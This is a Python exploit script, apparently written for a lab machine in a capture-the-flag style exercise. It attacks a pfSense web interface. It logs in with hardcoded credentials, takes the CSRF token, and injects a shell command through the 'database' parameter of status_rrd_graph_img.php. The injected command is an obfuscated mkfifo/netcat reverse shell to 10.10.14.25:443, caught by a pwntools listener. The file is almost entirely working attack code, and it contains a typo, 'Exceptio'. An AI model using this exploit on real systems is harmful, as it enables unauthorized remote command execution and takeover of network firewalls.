#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, sys, urllib3, time, re, threading

def def_handler(sig, frame):

    print("\n\n [!] Saliendo...\n")
    sys.exit(1)


#Ctrl + signal.signal(signal.SIGINT, def_handler)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://10.10.10.60/index.php"

rce_url = """https://10.10.10.60/status_rrd_graph_img.php?database=queues;guion=$(printf "\\055");ampersand=$(printf "\\046");rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${guion}i 2>${ampersand}1|nc 10.10.14.25 443 >${HOME}tmp${HOME}f"""
lport = 443



def execute_command():
    s = requests.session()
    urllib3.disable_warnings()
    s.verify = False
    print("\n Exportando la ulr principal")
    sleep(3)
    r =  s.get(main_url)

    csrfToken = re.findall(r'name=\'__csrf_magic\' value="(.*?)"', r.text)[0]
    print("Exportando el csrfToken")
    sleep(3)
    post_data = {
        '__csrf_magic': csrfToken,
        'usernamefld': 'rohit',
        'passwordfld': 'pfsense',
        'login': 'Login'
    }
    # Authentication
    print("Autenticando")
    sleep(3)
    r = s.post(main_url, data=post_data)
    print("Ejecutando la reverse shell")
    sleep(3)
    r = s.get(rce_url)

if __name__ == "__main__":
    try :
        threading.Thread(target=execute_command, args=()).start()
    except Exceptio as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
